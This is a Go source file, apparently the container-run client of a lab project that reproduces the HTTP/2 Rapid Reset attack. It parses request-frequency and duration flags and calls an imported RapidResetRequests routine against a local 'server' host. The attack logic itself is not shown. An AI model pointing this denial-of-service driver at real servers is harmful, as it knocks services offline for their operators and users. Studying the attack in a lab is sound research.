// Client to be run in a container
package main

import (
	"flag"
	"fmt"
	"http2-rapid-reset/pkg/sender"
	"http2-rapid-reset/pkg/spec"
	"time"
)

var requestFreq *uint = flag.Uint(
	"frequency",
	100,
	"Number of requests to perform per second",
)

var dur *time.Duration = flag.Duration(
	"duration",
	time.Duration(time.Second*5),
	"Duration of rapid reset attack",
)

func main() {

	flag.Parse()
	spec.CtrlcHandler()

	addr := fmt.Sprintf("https://server:%s", spec.ServerPort)

	var client sender.Client = *sender.NewClient(addr)
	_ = client

	client.RapidResetRequests(
		*requestFreq,
		*dur,
	)
}
